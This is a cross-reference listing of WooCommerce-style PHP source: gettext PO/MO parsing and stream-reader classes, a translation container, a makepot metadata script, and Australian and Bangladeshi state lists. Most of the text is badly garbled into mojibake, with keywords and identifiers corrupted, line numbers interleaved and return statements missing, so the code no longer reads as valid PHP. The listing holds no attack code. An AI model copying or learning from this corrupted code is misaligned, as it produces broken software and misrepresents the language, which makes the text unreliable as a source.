$Œª¦©iÚ
);

215  
	`im¶ode
("\n", 
$po
);

216 
	}
}

218 
funùiÚ
 
	$impÜt_äom_fe
(
$f’ame
) {

219 
$f
 = 
	`fİ’
(
$f’ame
, 'r');

220 ià(!
$f
è 
çl£
;

221 
$lš’o
 = 0;

222 
Œue
) {

223 
$»s
 = 
$this
->
	`»ad_’Œy
(
$f
, 
$lš’o
);

224 ià(!
$»s
) ;

225 ià(
$»s
['’Œy']->
sšguÏr
 == '') {

226 
$this
->
	`£t_h—d”s
($this->
	`make_h—d”s
(
$»s
['’Œy']->
Œª¦©iÚs
[0]));

228 
$this
->
	`add_’Œy
(
$»s
['entry']);

231 
PO
::
	`»ad_lše
(
$f
, 'clear');

232 iàĞ
çl£
 ==ğ
$»s
 ) {

233  
çl£
;

235 iàĞ! 
$this
->
h—d”s
 && ! $this->
’Œ›s
 ) {

236  
çl£
;

238  
Œue
;

239 
	}
}

241 
funùiÚ
 
	$»ad_’Œy
(
$f
, 
$lš’o
 = 0) {

242 
$’Œy
 = 
Ãw
 
	`T¿n¦©iÚ_EÁry
();

245 
$cÚ‹xt
 = '';

246 
$msg¡r_šdex
 = 0;

247 
$is_fš®
 = 
	`ü—‹_funùiÚ
('$context', 'return $context == "msgstr" || $context == "msgstr_plural";');

248 
Œue
) {

249 
$lš’o
++;

250 
$lše
 = 
PO
::
	`»ad_lše
(
$f
);

251 ià(!
$lše
) {

252 ià(
	`ãof
(
$f
)) {

253 ià(
	`$is_fš®
(
$cÚ‹xt
))

255 
	`–£if
 (!
$cÚ‹xt
)

256  
nuÎ
;

258  
çl£
;

260  
çl£
;

263 ià(
$lše
 == "\n") ;

264 
$lše
 = 
	`Œim
($line);

265 ià(
	`´eg_m©ch
('/^#/', 
$lše
, 
$m
)) {

267 ià(
	`$is_fš®
(
$cÚ‹xt
)) {

268 
PO
::
	`»ad_lše
(
$f
, 'put-back');

269 
$lš’o
--;

273 ià(
$cÚ‹xt
 && $context != 'comment') {

274  
çl£
;

277 
$this
->
	`add_comm’t_to_’Œy
(
$’Œy
, 
$lše
);;

278 } 
	`–£if
 (
	`´eg_m©ch
('/^msgùxt\s+(".*")/', 
$lše
, 
$m
)) {

279 ià(
	`$is_fš®
(
$cÚ‹xt
)) {

280 
PO
::
	`»ad_lše
(
$f
, 'put-back');

281 
$lš’o
--;

284 ià(
$cÚ‹xt
 && $context != 'comment') {

285  
çl£
;

287 
$cÚ‹xt
 = 'msgctxt';

288 
$’Œy
->
cÚ‹xt
 .ğ
PO
::
	`uÅoify
(
$m
[1]);

289 } 
	`–£if
 (
	`´eg_m©ch
('/^msgid\s+(".*")/', 
$lše
, 
$m
)) {

290 ià(
	`$is_fš®
(
$cÚ‹xt
)) {

291 
PO
::
	`»ad_lše
(
$f
, 'put-back');

292 
$lš’o
--;

295 ià(
$cÚ‹xt
 && $context != 'msgctxt' && $context != 'comment') {

296  
çl£
;

298 
$cÚ‹xt
 = 'msgid';

299 
$’Œy
->
sšguÏr
 .ğ
PO
::
	`uÅoify
(
$m
[1]);

300 } 
	`–£if
 (
	`´eg_m©ch
('/^msgid_¶u¿l\s+(".*")/', 
$lše
, 
$m
)) {

301 ià(
$cÚ‹xt
 != 'msgid') {

302  
çl£
;

304 
$cÚ‹xt
 = 'msgid_plural';

305 
$’Œy
->
is_¶u¿l
 = 
Œue
;

306 
$’Œy
->
¶u¿l
 .ğ
PO
::
	`uÅoify
(
$m
[1]);

307 } 
	`–£if
 (
	`´eg_m©ch
('/^msg¡r\s+(".*")/', 
$lše
, 
$m
)) {

308 ià(
$cÚ‹xt
 != 'msgid') {

309  
çl£
;

311 
$cÚ‹xt
 = 'msgstr';

312 
$’Œy
->
Œª¦©iÚs
 = 
	`¬¿y
(
PO
::
	`uÅoify
(
$m
[1]));

313 } 
	`–£if
 (
	`´eg_m©ch
('/^msg¡r\[(\d+)\]\s+(".*")/', 
$lše
, 
$m
)) {

314 ià(
$cÚ‹xt
 != 'msgid_plural' && $context != 'msgstr_plural') {

315  
çl£
;

317 
$cÚ‹xt
 = 'msgstr_plural';

318 
$msg¡r_šdex
 = 
$m
[1];

319 
$’Œy
->
Œª¦©iÚs
[
$m
[1]] = 
PO
::
	`uÅoify
($m[2]);

320 } 
	`–£if
 (
	`´eg_m©ch
('/^".*"$/', 
$lše
)) {

321 
$uÅoif›d
 = 
PO
::
	`uÅoify
(
$lše
);

322 
$cÚ‹xt
) {

324 
$’Œy
->
sšguÏr
 .ğ
$uÅoif›d
; ;

326 
$’Œy
->
cÚ‹xt
 .ğ
$uÅoif›d
; ;

328 
$’Œy
->
¶u¿l
 .ğ
$uÅoif›d
; ;

330 
$’Œy
->
Œª¦©iÚs
[0] .ğ
$uÅoif›d
; ;

332 
$’Œy
->
Œª¦©iÚs
[
$msg¡r_šdex
] .ğ
$uÅoif›d
; ;

334  
çl£
;

337  
çl£
;

340 ià(
	`¬¿y
(è=ğ
	`¬¿y_f‹r
(
$’Œy
->
Œª¦©iÚs
, 
	`ü—‹_funùiÚ
('$t', 'return $t || "0" === $t;'))) {

341 
$’Œy
->
Œª¦©iÚs
 = 
	`¬¿y
();

343  
	`¬¿y
('’Œy' => 
$’Œy
, 'lš’o' => 
$lš’o
);

344 
	}
}

346 
public
 
funùiÚ
 
»ad_lše
(
$f
, 
$aùiÚ
 = 'read') {

347 
$Ï¡_lše
 = '';

348 
	g$u£_Ï¡_lše
 = 
çl£
;

349 ià('ş—r' =ğ
$aùiÚ
) {

350 
$Ï¡_lše
 = '';

351  
	gŒue
;

353 ià('put-back' =ğ
$aùiÚ
) {

354 
$u£_Ï¡_lše
 = 
Œue
;

355  
	gŒue
;

357 
	g$lše
 = 
$u£_Ï¡_lše
? 
$Ï¡_lše
 : 
fg‘s
(
$f
);

358 
	g$lše
 = 
gp_’dsw™h
Ğ
$lše
, "\r\n" )? 
¹rim
( $line, "\r\n" ) . "\n" : $line;

359 
	g$Ï¡_lše
 = 
$lše
;

360 
	g$u£_Ï¡_lše
 = 
çl£
;

361  
	g$lše
;

364 
public
 
funùiÚ
 
	$add_comm’t_to_’Œy
(&
$’Œy
, 
$po_comm’t_lše
) {

365 
$fœ¡_two
 = 
	`sub¡r
(
$po_comm’t_lše
, 0, 2);

366 
$comm’t
 = 
	`Œim
(
	`sub¡r
(
$po_comm’t_lše
, 2));

367 ià('#:' =ğ
$fœ¡_two
) {

368 
$’Œy
->
»ã»nûs
 = 
	`¬¿y_m”ge
($’Œy->»ã»nûs, 
	`´eg_¥l™
('/\s+/', 
$comm’t
));

369 } 
	`–£if
 ('#.' =ğ
$fœ¡_two
) {

370 
$’Œy
->
exŒaùed_comm’ts
 = 
	`Œim
($’Œy->exŒaùed_comm’t . "\n" . 
$comm’t
);

371 } 
	`–£if
 ('#,' =ğ
$fœ¡_two
) {

372 
$’Œy
->
æags
 = 
	`¬¿y_m”ge
($’Œy->æags, 
	`´eg_¥l™
('/,\s*/', 
$comm’t
));

374 
$’Œy
->
Œª¦©Ü_comm’ts
 = 
	`Œim
($’Œy->Œª¦©Ü_comm’t . "\n" . 
$comm’t
);

376 
	}
}

378 
public
 
funùiÚ
 
	$Œim_quÙes
(
$s
) {

379 iàĞ
	`sub¡r
(
$s
, 0, 1) == '"') $s = substr($s, 1);

380 iàĞ
	`sub¡r
(
$s
, -1, 1) == '"') $s = substr($s, 0, -1);

381  
$s
;

382 
	}
}

384 
	g’dif
;

	@i18n/makepot/pomo/streams.php

1 <?
php


11 iàĞ!
şass_exi¡s
( 'POMO_Reader' ) ):

12 şas 
	cPOMO_R—d”
 {

14 
v¬
 
$’dŸn
 = 'little';

15 
v¬
 
	m$_po¡
 = '';

17 
funùiÚ
 
	$POMO_R—d”
() {

18 
$this
->
is_ov”lßded
 = ((
	`ši_g‘
("mb¡ršg.func_ov”lßd"è& 2è!ğ0è&& 
	`funùiÚ_exi¡s
('mb_substr');

19 
$this
->
_pos
 = 0;

27 
funùiÚ
 
	$£tEndŸn
(
$’dŸn
) {

28 
$this
->
’dŸn
 = 
$’dŸn
;

29 
	}
}

37 
funùiÚ
 
	$»adšt32
() {

38 
$by‹s
 = 
$this
->
	`»ad
(4);

39 ià(4 !ğ
$this
->
	`¡¾’
(
$by‹s
))

40  
çl£
;

41 
$’dŸn_Ë‰”
 = ('big' =ğ
$this
->
’dŸn
)? 'N' : 'V';

42 
$št
 = 
	`uÅack
(
$’dŸn_Ë‰”
, 
$by‹s
);

43  
	`¬¿y_shiá
(
$št
);

44 
	}
}

53 
funùiÚ
 
	$»adšt32¬¿y
(
$couÁ
) {

54 
$by‹s
 = 
$this
->
	`»ad
(4 * 
$couÁ
);

55 ià(4*
$couÁ
 !ğ
$this
->
	`¡¾’
(
$by‹s
))

56  
çl£
;

57 
$’dŸn_Ë‰”
 = ('big' =ğ
$this
->
’dŸn
)? 'N' : 'V';

58  
	`uÅack
(
$’dŸn_Ë‰”
.
$couÁ
, 
$by‹s
);

59 
	}
}

62 
funùiÚ
 
	$sub¡r
(
$¡ršg
, 
$¡¬t
, 
$Ëngth
) {

63 ià(
$this
->
is_ov”lßded
) {

64  
	`mb_sub¡r
(
$¡ršg
, 
$¡¬t
, 
$Ëngth
, 'ascii');

66  
	`sub¡r
(
$¡ršg
, 
$¡¬t
, 
$Ëngth
);

68 
	}
}

70 
funùiÚ
 
	$¡¾’
(
$¡ršg
) {

71 ià(
$this
->
is_ov”lßded
) {

72  
	`mb_¡¾’
(
$¡ršg
, 'ascii');

74  
	`¡¾’
(
$¡ršg
);

76 
	}
}

78 
funùiÚ
 
	$¡r_¥l™
(
$¡ršg
, 
$chunk_size
) {

79 ià(!
	`funùiÚ_exi¡s
('str_split')) {

80 
$Ëngth
 = 
$this
->
	`¡¾’
(
$¡ršg
);

81 
$out
 = 
	`¬¿y
();

82 
$i
 = 0; $˜< 
$Ëngth
; $˜+ğ
$chunk_size
)

83 
$out
[] = 
$this
->
	`sub¡r
(
$¡ršg
, 
$i
, 
$chunk_size
);

84  
$out
;

86  
	`¡r_¥l™
Ğ
$¡ršg
, 
$chunk_size
 );

88 
	}
}

91 
funùiÚ
 
	$pos
() {

92  
$this
->
_pos
;

93 
	}
}

95 
funùiÚ
 
	$is_»sourû
() {

96  
Œue
;

97 
	}
}

99 
funùiÚ
 
	$şo£
() {

100  
Œue
;

101 
	}
}

103 
	g’dif
;

105 iàĞ!
şass_exi¡s
( 'POMO_FileReader' ) ):

106 şas 
	cPOMO_FeR—d”
 
ex‹nds
 
POMO_R—d”
 {

107 
funùiÚ
 
	$POMO_FeR—d”
(
$f’ame
) {

108 
·»Á
::
	`POMO_R—d”
();

109 
$this
->
_f
 = 
	`fİ’
(
$f’ame
, 'rb');

112 
funùiÚ
 
	$»ad
(
$by‹s
) {

113  
	`ä—d
(
$this
->
_f
, 
$by‹s
);

114 
	}
}

116 
funùiÚ
 
	$£ekto
(
$pos
) {

117 iàĞ-1 =ğ
	`f£ek
(
$this
->
_f
, 
$pos
, 
SEEK_SET
)) {

118  
çl£
;

120 
$this
->
_pos
 = 
$pos
;

121  
Œue
;

122 
	}
}

124 
funùiÚ
 
	$is_»sourû
() {

125  
	`is_»sourû
(
$this
->
_f
);

126 
	}
}

128 
funùiÚ
 
	$ãof
() {

129  
	`ãof
(
$this
->
_f
);

130 
	}
}

132 
funùiÚ
 
	$şo£
() {

133  
	`fşo£
(
$this
->
_f
);

134 
	}
}

136 
funùiÚ
 
	$»ad_®l
() {

137 
$®l
 = '';

138  !
$this
->
	`ãof
() )

139 
$®l
 .ğ
$this
->
	`»ad
(4096);

140  
$®l
;

141 
	}
}

143 
	g’dif
;

145 iàĞ!
şass_exi¡s
( 'POMO_StringReader' ) ):

150 şas 
	cPOMO_SŒšgR—d”
 
ex‹nds
 
POMO_R—d”
 {

152 
v¬
 
$_¡r
 = '';

154 
funùiÚ
 
POMO_SŒšgR—d”
(
$¡r
 = '') {

155 
·»Á
::
POMO_R—d”
();

156 
	m$this
->
	m_¡r
 = 
$¡r
;

157 
	m$this
->
	m_pos
 = 0;

161 
funùiÚ
 
	$»ad
(
$by‹s
) {

162 
$d©a
 = 
$this
->
	`sub¡r
($this->
_¡r
, $this->
_pos
, 
$by‹s
);

163 
$this
->
_pos
 +ğ
$by‹s
;

164 ià(
$this
->
	`¡¾’
($this->
_¡r
è< $this->
_pos
) $this->_pos = $this->strlen($this->_str);

165  
$d©a
;

166 
	}
}

168 
funùiÚ
 
	$£ekto
(
$pos
) {

169 
$this
->
_pos
 = 
$pos
;

170 ià(
$this
->
	`¡¾’
($this->
_¡r
è< $this->
_pos
) $this->_pos = $this->strlen($this->_str);

171  
$this
->
_pos
;

172 
	}
}

174 
funùiÚ
 
	$Ëngth
() {

175  
$this
->
	`¡¾’
($this->
_¡r
);

176 
	}
}

178 
funùiÚ
 
	$»ad_®l
() {

179  
$this
->
	`sub¡r
($this->
_¡r
, $this->
_pos
, $this->
	`¡¾’
($this->_str));

180 
	}
}

183 
	g’dif
;

185 iàĞ!
şass_exi¡s
( 'POMO_CachedFileReader' ) ):

189 şas 
	cPOMO_CachedFeR—d”
 
ex‹nds
 
POMO_SŒšgR—d”
 {

190 
funùiÚ
 
	$POMO_CachedFeR—d”
(
$f’ame
) {

191 
·»Á
::
	`POMO_SŒšgR—d”
();

192 
$this
->
_¡r
 = 
	`fe_g‘_cÚ‹Ás
(
$f’ame
);

193 ià(
çl£
 ==ğ
$this
->
_¡r
)

194  
çl£
;

195 
$this
->
_pos
 = 0;

197 
	}
}

198 
	g’dif
;

200 iàĞ!
şass_exi¡s
( 'POMO_CachedIntFileReader' ) ):

204 şas 
	cPOMO_CachedIÁFeR—d”
 
ex‹nds
 
POMO_CachedFeR—d”
 {

205 
funùiÚ
 
	$POMO_CachedIÁFeR—d”
(
$f’ame
) {

206 
·»Á
::
	`POMO_CachedFeR—d”
(
$f’ame
);

208 
	}
}

209 
	g’dif
;

	@i18n/makepot/pomo/translations.php

1 <?
php


10 
»quœe_Úû
 
dœÇme
(
__FILE__
) . '/entry.php';

12 iàĞ!
şass_exi¡s
( 'Translations' ) ):

13 şas 
	cT¿n¦©iÚs
 {

14 
v¬
 
$’Œ›s
 = 
¬¿y
();

15 
v¬
 
	m$h—d”s
 = 
¬¿y
();

23 
funùiÚ
 
	$add_’Œy
(
$’Œy
) {

24 ià(
	`is_¬¿y
(
$’Œy
)) {

25 
$’Œy
 = 
Ãw
 
	`T¿n¦©iÚ_EÁry
($entry);

27 
$key
 = 
$’Œy
->
	`key
();

28 ià(
çl£
 ==ğ
$key
)  false;

29 
$this
->
’Œ›s
[
$key
] = &
$’Œy
;

30  
Œue
;

33 
funùiÚ
 
	$add_’Œy_Ü_m”ge
(
$’Œy
) {

34 ià(
	`is_¬¿y
(
$’Œy
)) {

35 
$’Œy
 = 
Ãw
 
	`T¿n¦©iÚ_EÁry
($entry);

37 
$key
 = 
$’Œy
->
	`key
();

38 ià(
çl£
 ==ğ
$key
)  false;

39 ià(
	`is£t
(
$this
->
’Œ›s
[
$key
]))

40 
$this
->
’Œ›s
[
$key
]->
	`m”ge_w™h
(
$’Œy
);

42 
$this
->
’Œ›s
[
$key
] = &
$’Œy
;

43  
Œue
;

44 
	}
}

56 
funùiÚ
 
	$£t_h—d”
(
$h—d”
, 
$v®ue
) {

57 
$this
->
h—d”s
[
$h—d”
] = 
$v®ue
;

58 
	}
}

60 
funùiÚ
 
	$£t_h—d”s
(&
$h—d”s
) {

61 
	`fÜ—ch
(
$h—d”s
 
as
 
$h—d”
 => 
$v®ue
) {

62 
$this
->
	`£t_h—d”
(
$h—d”
, 
$v®ue
);

64 
	}
}

66 
funùiÚ
 
	$g‘_h—d”
(
$h—d”
) {

67  
	`is£t
(
$this
->
h—d”s
[
$h—d”
])? $this->h—d”s[$h—d”] : 
çl£
;

68 
	}
}

70 
funùiÚ
 
	$Œª¦©e_’Œy
(&
$’Œy
) {

71 
$key
 = 
$’Œy
->
	`key
();

72  
	`is£t
(
$this
->
’Œ›s
[
$key
])? $this->’Œ›s[$key] : 
çl£
;

73 
	}
}

75 
funùiÚ
 
	$Œª¦©e
(
$sšguÏr
, 
$cÚ‹xt
=
nuÎ
) {

76 
$’Œy
 = 
Ãw
 
	`T¿n¦©iÚ_EÁry
(
	`¬¿y
('sšguÏr' => 
$sšguÏr
, 'cÚ‹xt' => 
$cÚ‹xt
));

77 
$Œª¦©ed
 = 
$this
->
	`Œª¦©e_’Œy
(
$’Œy
);

78  (
$Œª¦©ed
 && !
	`em±y
($Œª¦©ed->
Œª¦©iÚs
))? $Œª¦©ed->Œª¦©iÚs[0] : 
$sšguÏr
;

79 
	}
}

92 
funùiÚ
 
	$£Ëù_¶u¿l_fÜm
(
$couÁ
) {

93  1 =ğ
$couÁ
? 0 : 1;

94 
	}
}

96 
funùiÚ
 
	$g‘_¶u¿l_fÜms_couÁ
() {

98 
	}
}

100 
funùiÚ
 
	$Œª¦©e_¶u¿l
(
$sšguÏr
, 
$¶u¿l
, 
$couÁ
, 
$cÚ‹xt
 = 
nuÎ
) {

101 
$’Œy
 = 
Ãw
 
	`T¿n¦©iÚ_EÁry
(
	`¬¿y
('sšguÏr' => 
$sšguÏr
, '¶u¿l' => 
$¶u¿l
, 'cÚ‹xt' => 
$cÚ‹xt
));

102 
$Œª¦©ed
 = 
$this
->
	`Œª¦©e_’Œy
(
$’Œy
);

103 
$šdex
 = 
$this
->
	`£Ëù_¶u¿l_fÜm
(
$couÁ
);

104 
$tÙ®_¶u¿l_fÜms
 = 
$this
->
	`g‘_¶u¿l_fÜms_couÁ
();

105 ià(
$Œª¦©ed
 && 0 <ğ
$šdex
 && $šdex < 
$tÙ®_¶u¿l_fÜms
 &&

106 
	`is_¬¿y
(
$Œª¦©ed
->
Œª¦©iÚs
) &&

107 
	`is£t
(
$Œª¦©ed
->
Œª¦©iÚs
[
$šdex
]))

108  
$Œª¦©ed
->
Œª¦©iÚs
[
$šdex
];

110  1 =ğ
$couÁ
? 
$sšguÏr
 : 
$¶u¿l
;

111 
	}
}

119 
funùiÚ
 
	$m”ge_w™h
(&
$Ùh”
) {

120 
	`fÜ—ch
Ğ
$Ùh”
->
’Œ›s
 
as
 
$’Œy
 ) {

121 
$this
->
’Œ›s
[
$’Œy
->
	`key
()] = $entry;

123 
	}
}

125 
funùiÚ
 
	$m”ge_Üigš®s_w™h
(&
$Ùh”
) {

126 
	`fÜ—ch
Ğ
$Ùh”
->
’Œ›s
 
as
 
$’Œy
 ) {

127 iàĞ!
	`is£t
Ğ
$this
->
’Œ›s
[
$’Œy
->
	`key
()] ) )

128 
$this
->
’Œ›s
[
$’Œy
->
	`key
()] = $entry;

130 
$this
->
’Œ›s
[
$’Œy
->
	`key
()]->
	`m”ge_w™h
($entry);

132 
	}
}

135 şas 
	cG‘‹xt_T¿n¦©iÚs
 
ex‹nds
 
	mT¿n¦©iÚs
 {

143 
funùiÚ
 
	$g‘‹xt_£Ëù_¶u¿l_fÜm
(
$couÁ
) {

144 ià(!
	`is£t
(
$this
->
_g‘‹xt_£Ëù_¶u¿l_fÜm
è|| 
	`is_nuÎ
($this->_gettext_select_plural_form)) {

145 
	`li¡
Ğ
$Ålu¿ls
, 
$ex´essiÚ
 ) = 
$this
->
	`Ålu¿ls_ªd_ex´essiÚ_äom_h—d”
($this->
	`g‘_h—d”
('Plural-Forms'));

146 
$this
->
_Ålu¿ls
 = 
$Ålu¿ls
;

147 
$this
->
_g‘‹xt_£Ëù_¶u¿l_fÜm
 = $this->
	`make_¶u¿l_fÜm_funùiÚ
(
$Ålu¿ls
, 
$ex´essiÚ
);

149  
	`ÿÎ_u£r_func
(
$this
->
_g‘‹xt_£Ëù_¶u¿l_fÜm
, 
$couÁ
);

152 
funùiÚ
 
	$Ålu¿ls_ªd_ex´essiÚ_äom_h—d”
(
$h—d”
) {

153 ià(
	`´eg_m©ch
('/^\s*Ålu¿ls\s*=\s*(\d+)\s*;\s+¶u¿l\s*=\s*(.+)$/', 
$h—d”
, 
$m©ches
)) {

154 
$Ålu¿ls
 = ()
$m©ches
[1];

155 
$ex´essiÚ
 = 
	`Œim
(
$this
->
	`·»Áhesize_¶u¿l_ex»ssiÚ
(
$m©ches
[2]));

156  
	`¬¿y
(
$Ålu¿ls
, 
$ex´essiÚ
);

158  
	`¬¿y
(2, 'n != 1');

160 
	}
}

166 
funùiÚ
 
	$make_¶u¿l_fÜm_funùiÚ
(
$Ålu¿ls
, 
$ex´essiÚ
) {

167 
$ex´essiÚ
 = 
	`¡r_»¶aû
('n', '$n', $expression);

168 
$func_body
 = "

169 \
$šdex
 = ()(
$ex´essiÚ
);

170  (\
$šdex
 < 
$Ålu¿ls
)? \$index : $nplurals - 1;";

171  
	`ü—‹_funùiÚ
('$n', 
$func_body
);

172 
	}
}

181 
funùiÚ
 
	$·»Áhesize_¶u¿l_ex»ssiÚ
(
$ex´essiÚ
) {

182 
$ex´essiÚ
 .= ';';

183 
$»s
 = '';

184 
$d•th
 = 0;

185 
$i
 = 0; $˜< 
	`¡¾’
(
$ex´essiÚ
); ++$i) {

186 
$ch¬
 = 
$ex´essiÚ
[
$i
];

187 
$ch¬
) {

189 
$»s
 .= ' ? (';

190 
$d•th
++;

193 
$»s
 .= ') : (';

196 
$»s
 .ğ
	`¡r_»³©
(')', 
$d•th
) . ';';

197 
$d•th
= 0;

200 
$»s
 .ğ
$ch¬
;

203  
	`¹rim
(
$»s
, ';');

204 
	}
}

206 
funùiÚ
 
	$make_h—d”s
(
$Œª¦©iÚ
) {

207 
$h—d”s
 = 
	`¬¿y
();

209 
$Œª¦©iÚ
 = 
	`¡r_»¶aû
('\n', "\n", $translation);

210 
$lšes
 = 
	`ex¶ode
("\n", 
$Œª¦©iÚ
);

211 
	`fÜ—ch
(
$lšes
 
as
 
$lše
) {

212 
$·¹s
 = 
	`ex¶ode
(':', 
$lše
, 2);

213 ià(!
	`is£t
(
$·¹s
[1])) ;

214 
$h—d”s
[
	`Œim
(
$·¹s
[0])] =rim($parts[1]);

216  
$h—d”s
;

217 
	}
}

219 
funùiÚ
 
	$£t_h—d”
(
$h—d”
, 
$v®ue
) {

220 
·»Á
::
	`£t_h—d”
(
$h—d”
, 
$v®ue
);

221 ià('Plu¿l-FÜms' =ğ
$h—d”
) {

222 
	`li¡
Ğ
$Ålu¿ls
, 
$ex´essiÚ
 ) = 
$this
->
	`Ålu¿ls_ªd_ex´essiÚ_äom_h—d”
($this->
	`g‘_h—d”
('Plural-Forms'));

223 
$this
->
_Ålu¿ls
 = 
$Ålu¿ls
;

224 
$this
->
_g‘‹xt_£Ëù_¶u¿l_fÜm
 = $this->
	`make_¶u¿l_fÜm_funùiÚ
(
$Ålu¿ls
, 
$ex´essiÚ
);

226 
	}
}

228 
	g’dif
;

230 iàĞ!
şass_exi¡s
( 'NOOP_Translations' ) ):

234 şas 
	cNOOP_T¿n¦©iÚs
 {

235 
v¬
 
$’Œ›s
 = 
¬¿y
();

236 
v¬
 
	m$h—d”s
 = 
¬¿y
();

238 
funùiÚ
 
	$add_’Œy
(
$’Œy
) {

239  
Œue
;

242 
funùiÚ
 
	$£t_h—d”
(
$h—d”
, 
$v®ue
) {

243 
	}
}

245 
funùiÚ
 
	$£t_h—d”s
(&
$h—d”s
) {

246 
	}
}

248 
funùiÚ
 
	$g‘_h—d”
(
$h—d”
) {

249  
çl£
;

250 
	}
}

252 
funùiÚ
 
	$Œª¦©e_’Œy
(&
$’Œy
) {

253  
çl£
;

254 
	}
}

256 
funùiÚ
 
	$Œª¦©e
(
$sšguÏr
, 
$cÚ‹xt
=
nuÎ
) {

257  
$sšguÏr
;

258 
	}
}

260 
funùiÚ
 
	$£Ëù_¶u¿l_fÜm
(
$couÁ
) {

261  1 =ğ
$couÁ
? 0 : 1;

262 
	}
}

264 
funùiÚ
 
	$g‘_¶u¿l_fÜms_couÁ
() {

266 
	}
}

268 
funùiÚ
 
	$Œª¦©e_¶u¿l
(
$sšguÏr
, 
$¶u¿l
, 
$couÁ
, 
$cÚ‹xt
 = 
nuÎ
) {

269  1 =ğ
$couÁ
? 
$sšguÏr
 : 
$¶u¿l
;

270 
	}
}

272 
funùiÚ
 
	$m”ge_w™h
(&
$Ùh”
) {

273 
	}
}

275 
	g’dif
;

	@i18n/makepot/pot-ext-meta.php

1 <?
php


11 
»quœe_Úû
 
dœÇme
Ğ
__FILE__
 ) . '/pomo/po.php';

12 
»quœe_Úû
 
dœÇme
Ğ
__FILE__
 ) . '/makepot.php';

14 şas 
	cPÙExtM‘a
 {

16 
v¬
 
	m$h—d”s
 = 
¬¿y
(

27 
funùiÚ
 
	$u§ge
() {

28 
	`fwr™e
(
STDERR
, "Usage:…hp…ot-ext-meta.php EXT POT\n");

29 
	`fwr™e
(
STDERR
, "Adds metadata from‡ WordPressheme or…lugin file EXTo POT file\n");

30 
	`ex™
(1);

33 
funùiÚ
 
	$lßd_äom_fe
(
$ext_f’ame
) {

34 
$sourû
 = 
WC_Mak•Ù
::
	`g‘_fœ¡_lšes
(
$ext_f’ame
);

35 
$pÙ
 = '';

36 
	`fÜ—ch
(
$this
->
h—d”s
 
as
 
$h—d”
) {

37 
$¡ršg
 = 
WC_Mak•Ù
::
	`g‘_addÚ_h—d”
(
$h—d”
, 
$sourû
);

38 ià(!
$¡ršg
) ;

39 
$¬gs
 = 
	`¬¿y
(

40 'sšguÏr' => 
$¡ršg
,

41 'exŒaùed_comm’ts' => 
$h—d”
.' ofhe…lugin/theme',

43 
$’Œy
 = 
Ãw
 
	`T¿n¦©iÚ_EÁry
(
$¬gs
);

44 
$pÙ
 .ğ"\n".
PO
::
	`expÜt_’Œy
(
$’Œy
)."\n";

46  
$pÙ
;

47 
	}
}

49 
funùiÚ
 
	$­³nd
Ğ
$ext_f’ame
, 
$pÙ_f’ame
, 
$h—d”s
 = 
nuÎ
 ) {

50 iàĞ
$h—d”s
 )

51 
$this
->
h—d”s
 = (
¬¿y
è
$h—d”s
;

52 iàĞ
	`is_dœ
Ğ
$ext_f’ame
 ) ) {

53 
$pÙ
 = 
	`im¶ode
('', 
	`¬¿y_m­
(
	`¬¿y
(&
$this
, 'lßd_äom_fe'), 
	`glob
("$ext_filename/*.php")));

55 
$pÙ
 = 
$this
->
	`lßd_äom_fe
(
$ext_f’ame
);

57 
$pÙf
 = '-' =ğ
$pÙ_f’ame
? 
STDOUT
 : 
	`fİ’
( $pot_filename, 'a' );

58 ià(!
$pÙf
è 
çl£
;

59 
	`fwr™e
(
$pÙf
, 
$pÙ
);

60 ià('-' !ğ
$pÙ_f’ame
è
	`fşo£
(
$pÙf
);

61  
Œue
;

62 
	}
}

65 
	g$šşuded_fes
 = 
g‘_šşuded_fes
();

66 iàĞ
	g$šşuded_fes
[0] =ğ
__FILE__
 ) {

72 
ex™
( 'Locked' );

74 
ši_£t
('display_errors', 1);

75 
	g$pÙextm‘a
 = 
Ãw
 
PÙExtM‘a
;

76 ià(!
is£t
(
$¬gv
[1])) {

77 
	g$pÙextm‘a
->
u§ge
();

79 
	g$pÙextm‘a
->
­³nd
Ğ
$¬gv
[1], 
is£t
Ğ$¬gv[2] ) ? $¬gv[2] : '-', is£tĞ$¬gv[3] ) ? $¬gv[3] : 
nuÎ
 );

	@i18n/states/AU.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['AU'] = 
¬¿y
(

13 'ACT' => 
__
( 'Australian Capital Territory', 'woocommerce' ),

14 'NSW' => 
__
( 'New South Wales', 'woocommerce' ),

15 'NT' => 
__
( 'Northern Territory', 'woocommerce' ),

16 'QLD' => 
__
( 'Queensland', 'woocommerce' ),

17 'SA' => 
__
( 'South Australia', 'woocommerce' ),

18 'TAS' => 
__
( 'Tasmania', 'woocommerce' ),

19 'VIC' => 
__
( 'Victoria', 'woocommerce' ),

20 'WA' => 
__
( 'Western Australia', 'woocommerce' )

	@i18n/states/BD.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['BD'] = 
¬¿y
(

13 'BAG' => 
__
( 'Bagerhat', 'woocommerce' ),

14 'BAN' => 
__
( 'Bandarban', 'woocommerce' ),

15 'BAR' => 
__
( 'Barguna', 'woocommerce' ),

16 'BARI' => 
__
( 'Barisal', 'woocommerce' ),

17 'BHO' => 
__
( 'Bhola', 'woocommerce' ),

18 'BOG' => 
__
( 'Bogra', 'woocommerce' ),

19 'CHA' => 
__
( 'Chandpur', 'woocommerce' ),

20 'CHI' => 
__
( 'Chittagong', 'woocommerce' ),

21 'CHU' => 
__
( 'Chuadanga', 'woocommerce' ),

22 'COM' => 
__
( 'Comilla', 'woocommerce' ),

23 'COX' => 
__
( 'Cox\'s Bazar', 'woocommerce' ),

24 'DHA' => 
__
( 'Dhaka', 'woocommerce' ),

25 'DIN' => 
__
( 'Dinajpur', 'woocommerce' ),

26 'FAR' => 
__
( 'Faridpur ', 'woocommerce' ),

27 'FEN' => 
__
( 'Feni', 'woocommerce' ),

28 'GAI' => 
__
( 'Gaibandha', 'woocommerce' ),

29 'GAZI' => 
__
( 'Gazipur', 'woocommerce' ),

30 'GOP' => 
__
( 'Gopalganj', 'woocommerce' ),

31 'JAM' => 
__
( 'Jamalpur', 'woocommerce' ),

32 'JES' => 
__
( 'Jessore', 'woocommerce' ),

33 'JHA' => 
__
( 'Jhalokati', 'woocommerce' ),

34 'JHE' => 
__
( 'Jhenaidah', 'woocommerce' ),

35 'JOY' => 
__
( 'Joypurhat', 'woocommerce' ),

36 'KHA' => 
__
( 'Khagrachhari', 'woocommerce' ),

37 'KHU' => 
__
( 'Khulna', 'woocommerce' ),

38 'KIS' => 
__
( 'Kishoreganj', 'woocommerce' ),

39 'KUR' => 
__
